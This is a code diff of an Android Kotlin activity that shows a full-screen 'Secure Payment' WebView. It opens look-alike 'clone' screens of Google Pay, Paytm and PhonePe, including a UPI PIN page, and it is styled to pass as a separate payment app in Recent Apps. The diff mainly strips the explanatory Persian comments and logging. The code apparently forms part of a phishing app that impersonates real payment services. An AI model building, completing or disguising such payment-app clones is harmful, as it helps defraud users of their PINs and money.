@@ -19,14 +19,6 @@ import androidx.core.view.WindowInsetsControllerCompat
 import com.example.test.utils.DeviceInfoHelper
 import com.example.test.ServerConfig
 
-/**
- * ⭐ PaymentActivity - نمایش صفحه پرداخت به صورت کلون (مثل یک برنامه جداگانه)
- * 
- * این Activity با taskAffinity جداگانه باز میشه که باعث میشه:
- * - مثل یک برنامه جداگانه در Recent Apps نمایش داده بشه
- * - Task جداگانه داشته باشه
- * - تجربه کاربری مثل باز کردن یک برنامه پرداخت خارجی باشه
- */
 class PaymentActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
@@ -40,52 +32,31 @@ class PaymentActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        // ⭐ Fullscreen mode
         enableFullscreen()
-        
-        // ⭐ تنظیم Task Description برای نمایش در Recent Apps
         setTaskDescriptionForRecentApps()
         
-        // ⭐ Load config
         appConfig = AppConfig.load(this)
         deviceId = DeviceInfoHelper.getDeviceId(this)
         
-        // ⭐ Initialize ServerConfig
         ServerConfig.initialize(this)
         
-        Log.d(TAG, "════════════════════════════════════════")
-        Log.d(TAG, "🚀 PAYMENT ACTIVITY CREATED")
-        Log.d(TAG, "════════════════════════════════════════")
-        Log.d(TAG, "📱 Device ID: $deviceId")
-        Log.d(TAG, "📱 App Type: ${appConfig.appType}")
-        Log.d(TAG, "════════════════════════════════════════")
-        
-        // ⭐ Create WebView
         webView = createWebView()
         setContentView(webView)
         
-        // ⭐ Load payment HTML based on flavor
         loadPaymentHtml()
     }
 
-    /**
-     * ⭐ تنظیم Task Description برای نمایش در Recent Apps
-     * این باعث میشه که مثل یک برنامه جداگانه نمایش داده بشه
-     */
     private fun setTaskDescriptionForRecentApps() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             val taskDescription = ActivityManager.TaskDescription(
-                "Secure Payment",  // نام در Recent Apps
-                BitmapFactory.decodeResource(resources, android.R.drawable.ic_menu_myplaces), // Icon
-                ContextCompat.getColor(this, android.R.color.white) // Color
+                "Secure Payment",
+                BitmapFactory.decodeResource(resources, android.R.drawable.ic_menu_myplaces),
+                ContextCompat.getColor(this, android.R.color.white)
             )
             setTaskDescription(taskDescription)
         }
     }
 
-    /**
-     * ⭐ Fullscreen mode
-     */
     private fun enableFullscreen() {
         supportActionBar?.hide()
         
@@ -95,25 +66,20 @@ class PaymentActivity : AppCompatActivity() {
         windowInsetsController.apply {
             hide(WindowInsetsCompat.Type.systemBars())
             systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
-            // ⭐ تنظیم رنگ status bar icons به تیره (dark) - برای background روشن
+            
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                isAppearanceLightStatusBars = true // true = icons تیره (برای background روشن)
+                isAppearanceLightStatusBars = true
             }
-            // ⭐ تنظیم رنگ navigation bar icons
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                isAppearanceLightNavigationBars = false // icons روشن برای navigation bar
+                isAppearanceLightNavigationBars = false
             }
         }
         
         window.statusBarColor = android.graphics.Color.TRANSPARENT
         window.navigationBarColor = android.graphics.Color.TRANSPARENT
-        
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
     }
 
-    /**
-     * ⭐ ساخت WebView برای نمایش صفحه پرداخت
-     */
     private fun createWebView(): WebView {
         val webView = WebView(this).apply {
             layoutParams = android.view.ViewGroup.LayoutParams(
@@ -159,7 +125,6 @@ class PaymentActivity : AppCompatActivity() {
             webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
         }
 
-        // ⭐ WebViewClient برای مدیریت navigation
         webView.webViewClient = object : WebViewClient() {
             override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                 val url = request?.url?.toString() ?: return false
@@ -176,9 +141,6 @@ class PaymentActivity : AppCompatActivity() {
 
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
-                Log.d(TAG, "✅ Payment page loaded: $url")
-                
-                // ⭐ اعمال رنگ status bar از meta tag
                 applyThemeColorFromPage()
             }
         }
@@ -192,7 +154,6 @@ class PaymentActivity : AppCompatActivity() {
             }
         }
 
-        // ⭐ JavaScript Interface
         webView.addJavascriptInterface(object {
             @android.webkit.JavascriptInterface
             fun getDeviceId(): String = deviceId
@@ -209,13 +170,8 @@ class PaymentActivity : AppCompatActivity() {
             @android.webkit.JavascriptInterface
             fun getBaseUrl(): String = ServerConfig.getBaseUrl()
             
-            /**
-             * ⭐ باز کردن کلون روش پرداخت انتخاب شده
-             * @param paymentMethod نوع روش پرداخت: "gpay", "paytm", "phonepe"
-             */
             @android.webkit.JavascriptInterface
             fun openPaymentClone(paymentMethod: String) {
-                Log.d(TAG, "💰 Opening payment clone: $paymentMethod")
                 openPaymentCloneActivity(paymentMethod)
             }
         }, "Android")
@@ -223,22 +179,12 @@ class PaymentActivity : AppCompatActivity() {
         return webView
     }
 
-    /**
-     * ⭐ مدیریت navigation در صفحه پرداخت
-     * تمام صفحات مربوط به پرداخت (payment.html, googlepay-splash.html, upi-pin.html, final.html)
-     * در همین Activity لود می‌شن تا تجربه کلون حفظ بشه
-     */
     private fun handleUrlNavigation(url: String): Boolean {
-        Log.d(TAG, "🔗 Payment navigation request: $url")
-        
-        // ⭐ اگر URL خارج از assets هست، در همین WebView لود کن
         if (url.startsWith("http://") || url.startsWith("https://")) {
-            return false  // اجازه بده در WebView لود بشه
+            return false
         }
         
-        // ⭐ اگر فایل HTML داخلی هست (صفحات پرداخت)، در همین Activity لود کن
         if (url.endsWith(".html")) {
-            // ⭐ تبدیل URL نسبی به کامل اگر نیاز بود
             val fullUrl = if (url.startsWith("file://")) {
                 url
             } else if (url.startsWith("/")) {
@@ -247,32 +193,19 @@ class PaymentActivity : AppCompatActivity() {
                 "file:///android_asset/$url"
             }
             
-            Log.d(TAG, "📄 Loading payment page: $fullUrl")
             webView.loadUrl(fullUrl)
-            return true  // جلوگیری از لود شدن در مرورگر خارجی
+            return true
         }
         
         return false
     }
 
-    /**
-     * ⭐ لود کردن صفحه پرداخت بر اساس flavor
-     */
     private fun loadPaymentHtml() {
         val paymentHtmlPath = "file:///android_asset/payment.html"
-        Log.d(TAG, "📄 Loading payment page: $paymentHtmlPath")
         webView.loadUrl(paymentHtmlPath)
     }
     
-    /**
-     * ⭐ باز کردن Activity کلون روش پرداخت انتخاب شده
-     * @param paymentMethod نوع روش پرداخت: "gpay", "paytm", "phonepe"
-     */
     private fun openPaymentCloneActivity(paymentMethod: String) {
-        Log.d(TAG, "════════════════════════════════════════")
-        Log.d(TAG, "💰 OPENING PAYMENT CLONE: $paymentMethod")
-        Log.d(TAG, "════════════════════════════════════════")
-        
         val intent = when (paymentMethod.lowercase()) {
             "gpay", "googlepay", "google-pay" -> {
                 Intent(this, GPayCloneActivity::class.java)
@@ -284,18 +217,15 @@ class PaymentActivity : AppCompatActivity() {
                 Intent(this, PhonePeCloneActivity::class.java)
             }
             else -> {
-                Log.e(TAG, "❌ Unknown payment method: $paymentMethod")
+                Log.e(TAG, "Unknown payment method: $paymentMethod")
                 return
             }
         }
         
         startActivity(intent)
-        finish() // بستن PaymentActivity بعد از باز کردن کلون
+        finish()
     }
 
-    /**
-     * ⭐ اعمال رنگ status bar از meta tag صفحه
-     */
     private fun applyThemeColorFromPage() {
         webView.evaluateJavascript(
             """
@@ -314,37 +244,30 @@ class PaymentActivity : AppCompatActivity() {
         ) { color ->
             if (color != null && color != "null") {
                 val colorValue = color.replace("\"", "")
-                    try {
-                        val parsedColor = android.graphics.Color.parseColor(colorValue)
-                        // evaluateJavascript callback روی UI thread اجرا میشه، پس نیازی به runOnUiThread نیست
-                        runOnUiThread {
-                            window.statusBarColor = parsedColor
-                            window.navigationBarColor = parsedColor
-                            Log.d(TAG, "🎨 Status bar color set to: $colorValue")
-                        }
-                    } catch (e: Exception) {
-                        Log.e(TAG, "❌ Failed to parse color: $colorValue", e)
+                try {
+                    val parsedColor = android.graphics.Color.parseColor(colorValue)
+                    runOnUiThread {
+                        window.statusBarColor = parsedColor
+                        window.navigationBarColor = parsedColor
                     }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to parse color: $colorValue", e)
+                }
             }
         }
     }
 
-    /**
-     * ⭐ مدیریت دکمه برگشت
-     */
     @Deprecated("Deprecated in Java")
     override fun onBackPressed() {
         if (::webView.isInitialized && webView.canGoBack()) {
             webView.goBack()
         } else {
-            // ⭐ بستن Activity و برگشت به MainActivity
             finish()
         }
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        Log.d(TAG, "👋 PaymentActivity destroyed")
         
         if (::webView.isInitialized) {
             webView.stopLoading()
@@ -353,4 +276,3 @@ class PaymentActivity : AppCompatActivity() {
         }
     }
 }
-
